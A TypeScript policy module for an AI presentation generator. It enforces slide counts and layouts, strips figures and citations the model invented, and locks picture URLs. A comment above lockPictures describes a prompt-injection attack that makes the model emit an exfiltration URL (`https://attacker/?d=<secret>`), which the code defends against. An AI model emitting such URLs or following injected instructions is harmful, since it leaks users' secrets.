import type { Direction, Outline, PromptAnalysis, SlideContent, SourceRef } from '@prompttoppt/validation'

/**
 * Deterministic policy layer around the model (spec §5): the model proposes, these rules decide.
 * Nothing here calls an LLM.
 */

/** Hard ceiling (document schema max). The per-plan cap comes from entitlements. */
export const MAX_SLIDES = 60
export const DEFAULT_SLIDES = 10

const wordCount = (s: string) => s.trim().split(/\s+/).filter(Boolean).length

/**
 * Broad topic → show directions; detailed → go straight through. Hard thresholds override the model so a
 * hallucinated "detailed" on a 3-word prompt (or "broad" on a 60-word brief) can't bypass the product rule.
 */
export function decideMode(prompt: string, a: PromptAnalysis, hasSources: boolean): 'broad' | 'detailed' {
  const words = wordCount(prompt)
  if (hasSources) return 'detailed' // supplied material defines the deck
  if (words <= 6) return 'broad'
  if (words >= 40) return 'detailed'
  const statedConstraints = !!(a.slideCount || a.audience || a.objective || a.requiredSections.length || a.durationMinutes)
  return a.specificity === 'detailed' || statedConstraints ? 'detailed' : 'broad'
}

/** Slide count: user's explicit number > selected direction's suggestion > default; always clamped. */
export function resolveSlideCount(a: PromptAnalysis, direction?: Direction, requested?: number, planMax: number = MAX_SLIDES): number {
  const n = requested ?? a.slideCount ?? direction?.suggestedSlideCount ?? DEFAULT_SLIDES
  return Math.min(planMax, MAX_SLIDES, Math.max(3, Math.round(n)))
}

/** Numeric layouts (metrics / chart / big-number / case-study headline) are only allowed when real numbers exist in the request or sources. */
const NUMERIC_LAYOUTS = new Set(['chart', 'metrics', 'big-number', 'case-study'])
/** Mentions of the deck's own size/length ("8 slides", "10 minutes") are instructions, not data — they must not unlock numeric layouts. */
const stripInstructionNumbers = (t: string) => t.replace(/\b\d+\s*(?:-|–)?\s*(?:slides?|pages?|minutes?|mins?|hours?|words?|bullets?|points?)\b/gi, ' ').replace(/\b(?:slide|page)s?\s*\d+\b/gi, ' ')
export const hasNumbers = (userPrompt: string, sourceTexts: string[]) => /\d/.test(stripInstructionNumbers(userPrompt)) || sourceTexts.some((t) => /\d/.test(t))

/**
 * "Never invent data": every FIGURE a model writes must be traceable to the person's message, the deck's own text or the attached sources.
 * Data layouts (chart, table, metrics, big number, case study) are checked strictly (every number in their data fields); other layouts only for clearly invented statistics (a percentage, a
 * decimal, or a number of three digits or more, not a year), so ordinary wording ("3 steps", "24/7") is never refused. Digits of other scripts count as the same number (a Hindi translation of
 * "15%" is still 15). Returns the figures that cannot be traced.
 */
const DIGITS: Record<string, string> = Object.fromEntries([...'०१२३४५६७८९'].map((d, i) => [d, String(i)]).concat([...'٠١٢٣٤٥٦٧٨٩'].map((d, i) => [d, String(i)])))
const asciiDigits = (t: string) => t.replace(/[०-९٠-٩]/g, (d) => DIGITS[d] ?? d)
const tokensOf = (t: string): string[] => (asciiDigits(t).replace(/(\d),(\d{3})/g, '$1$2').match(/\d+(?:\.\d+)?%?/g) ?? []).map((x) => x.replace(/%$/, '')).map((x) => (x.includes('.') ? x.replace(/0+$/, '').replace(/\.$/, '') : x.replace(/^0+(?=\d)/, '')))
const DATA_LAYOUTS = new Set(['chart', 'table', 'metrics', 'big-number', 'case-study'])
const SKIP_KEYS = new Set(['layout', 'title', 'speakerNotes', 'sources', 'imageUrl', 'imageAlt', 'imagePrompt', 'imageAttribution', 'unit', 'chartType'])
const leaves = (v: unknown, key = ''): string[] => (SKIP_KEYS.has(key) ? [] : typeof v === 'number' ? [String(v)] : typeof v === 'string' ? [v] : Array.isArray(v) ? v.flatMap((x) => leaves(x, key)) : v && typeof v === 'object' ? Object.entries(v as Record<string, unknown>).flatMap(([k, x]) => leaves(x, k)) : [])
/** The figures a text contains, in the same form `figuresNotInSources` compares them (so "what was kept / dropped" is judged the same way "what was invented" is), limited to figures worth reporting. */
export const figuresOf = (text: string): string[] => {
  // a figure a person would notice: two or more digits, a decimal, or a percentage (a lone digit is usually a step number or a list count)
  const pct = asciiDigits(text).match(/\d+(?:\.\d+)?\s*%/g) ?? []
  return [...new Set([...tokensOf(text).filter((t) => t.includes('.') || t.length >= 2), ...tokensOf(pct.join(' '))])]
}

/** Every number in a short text (a table cell, a chart figure) that is not in the corpus: the person's words, the deck, the sources. Strict: a value typed into data must be traceable. */
export function figuresInTextNotIn(text: string, corpus: string): string[] {
  const known = new Set(tokensOf(corpus))
  return [...new Set(tokensOf(text).filter((t) => !known.has(t)))]
}
export function figuresNotInSources(c: SlideContent, corpus: string): string[] {
  const known = new Set(tokensOf(corpus))
  const strict = DATA_LAYOUTS.has(c.layout)
  const wanted = leaves(c).flatMap((t) => {
    const raw = asciiDigits(t)
    return tokensOf(t).filter((tok) => {
      if (strict) return true
      const year = /^(19|20|21)\d{2}$/.test(tok)
      return !year && (tok.includes('.') || tok.length >= 3 || new RegExp(`${tok}\\s*%`).test(raw))
    })
  })
  return [...new Set(wanted.filter((t) => !known.has(t)))]
}

/** Make the model's outline obey product rules regardless of what it returned. */
export function sanitizeOutline(o: Outline, slideCount: number, allowNumeric: boolean): Outline {
  let slides = o.slides.slice(0, slideCount).map((s) => ({
    ...s,
    layout: !allowNumeric && NUMERIC_LAYOUTS.has(s.layout) ? 'title-body' : s.layout,
  }))
  // The model sometimes returns fewer slides than asked: pad with a neutral content slide rather than fail the job.
  while (slides.length < slideCount) slides.splice(slides.length - 1, 0, { title: 'Key takeaways', purpose: 'Summarise the main points', layout: 'title-body', keyPoints: [], needsVisual: false })
  if (slides.length > 0) {
    slides[0] = { ...slides[0]!, layout: 'title' }
    const last = slides.length - 1
    if (last > 0 && slides[last]!.layout !== 'thank-you' && slides[last]!.layout !== 'title-body') slides[last] = { ...slides[last]!, layout: 'thank-you' }
    // Decks are photo-led: a share of the content slides carry a picture (plain text layouts become picture + text), spread through the deck
    const want = slideCount >= 10 ? 4 : slideCount >= 7 ? 3 : slideCount >= 5 ? 2 : slideCount >= 4 ? 1 : 0
    let have = slides.filter((x) => x.layout === 'split-image-text').length
    const spots = Array.from({ length: slides.length - 2 }, (_, k) => k + 1).sort((x, y) => Math.abs(x - slides.length / 2) * 0 + (x % 2 === 0 ? 0 : 1) - (y % 2 === 0 ? 0 : 1) || x - y) // even positions first, in order
    for (const i of spots) {
      if (have >= want) break
      const sl = slides[i]
      if (sl && sl.layout === 'title-body' && slides[i - 1]?.layout !== 'split-image-text' && slides[i + 1]?.layout !== 'split-image-text') { slides[i] = { ...sl, layout: 'split-image-text', needsVisual: true }; have++ }
    }
  }
  return { ...o, slides }
}

/** Drop citations that point at sources the user never supplied (the model can invent ids). */
export function sanitizeRefs(refs: SourceRef[], knownIds: Set<string>): SourceRef[] {
  return refs.filter((r) => knownIds.has(r.sourceId))
}

/**
 * A model must never choose a picture URL: a prompt-injected source could make it emit `https://attacker/?d=<secret>` (a tracking pixel in every
 * viewer's browser, and a server-side fetch on export). Pictures are set only by the picture pipeline; when an existing slide is edited its
 * picture is carried over from the slide as it was, never from the model's answer.
 */
export function lockPictures(next: SlideContent, previous?: SlideContent | null): SlideContent {
  if (next.layout !== 'split-image-text') return next
  const { imageUrl: _u, imageAttribution: _a, ...rest } = next
  const keep = previous && previous.layout === 'split-image-text' ? previous : null
  return { ...rest, ...(keep?.imageUrl ? { imageUrl: keep.imageUrl } : {}), ...(keep?.imageAttribution ? { imageAttribution: keep.imageAttribution } : {}) } as SlideContent
}

export function sanitizeContent(c: SlideContent, knownIds: Set<string>, allowNumeric: boolean, previous?: SlideContent | null): SlideContent {
  const out = sanitizeContentInner(lockPictures(c, previous), knownIds, allowNumeric)
  return lockPictures(out, previous)
}

function sanitizeContentInner(c: SlideContent, knownIds: Set<string>, allowNumeric: boolean): SlideContent {
  const sources = sanitizeRefs(c.sources, knownIds)
  if (!allowNumeric && NUMERIC_LAYOUTS.has(c.layout)) {
    // Defence in depth: the outline guard should already have prevented this. Keep the words, drop the invented numbers.
    const title = ('title' in c && c.title) || 'Key points'
    const bullets =
      c.layout === 'chart' ? [c.takeaway] : c.layout === 'metrics' ? c.metrics.map((m) => m.label) : c.layout === 'big-number' ? [c.label, ...c.context] : c.layout === 'case-study' ? [c.challenge, ...c.approach, ...c.results] : ['']
    return { layout: 'title-body', title, bullets: bullets.map((b) => b.slice(0, 180)).filter(Boolean).slice(0, 6), speakerNotes: c.speakerNotes, sources }
  }
  return { ...c, sources }
}

/** Last-resort shrink for slides that still overflow after layout fitting. */
export function condense(c: SlideContent): SlideContent {
  const cut = (s: string, n: number) => (s.length > n ? s.slice(0, n - 1).trimEnd() + '…' : s)
  switch (c.layout) {
    case 'title-body': return { ...c, bullets: c.bullets.slice(0, 4).map((b) => cut(b, 90)) }
    case 'split-image-text': return { ...c, bullets: c.bullets.slice(0, 3).map((b) => cut(b, 80)) }
    case 'comparison': return { ...c, left: { ...c.left, bullets: c.left.bullets.slice(0, 3).map((b) => cut(b, 70)) }, right: { ...c.right, bullets: c.right.bullets.slice(0, 3).map((b) => cut(b, 70)) } }
    case 'process': case 'timeline': return { ...c, steps: c.steps.map((s) => ({ label: cut(s.label, 28), detail: cut(s.detail, 90) })) }
    case 'agenda': return { ...c, items: c.items.slice(0, 6).map((i) => ({ label: cut(i.label, 44), ...(i.detail ? { detail: cut(i.detail, 60) } : {}) })) }
    case 'team': return { ...c, people: c.people.map((p) => ({ name: cut(p.name, 30), role: cut(p.role, 36), ...(p.bio ? { bio: cut(p.bio, 70) } : {}) })) }
    case 'matrix': return { ...c, quadrants: c.quadrants.map((q) => ({ heading: cut(q.heading, 28), bullets: q.bullets.slice(0, 2).map((b) => cut(b, 56)) })) as typeof c.quadrants }
    case 'roadmap': return { ...c, phases: c.phases.map((p) => ({ label: cut(p.label, 18), heading: cut(p.heading, 36), bullets: p.bullets.slice(0, 2).map((b) => cut(b, 56)) })) }
    case 'architecture': return { ...c, layers: c.layers.map((l) => ({ name: cut(l.name, 28), items: l.items.slice(0, 4).map((i) => cut(i, 26)) })) }
    case 'case-study': return { ...c, challenge: cut(c.challenge, 150), approach: c.approach.slice(0, 3).map((b) => cut(b, 80)), results: c.results.slice(0, 3).map((b) => cut(b, 80)) }
    case 'big-number': return { ...c, context: c.context.slice(0, 2).map((b) => cut(b, 90)) }
    // a Morph slide that still does not fit: a shorter title and no subtitle or kicker. The cards are never touched: they are the same cards on every slide, and a card cut short on one slide would no longer be the same card.
    case 'morph': { const { subtitle: _s, kicker: _k, ...rest } = c; return { ...rest, title: cut(c.title, c.scene === 'quote' ? 140 : 70) } }
    default: return c
  }
}
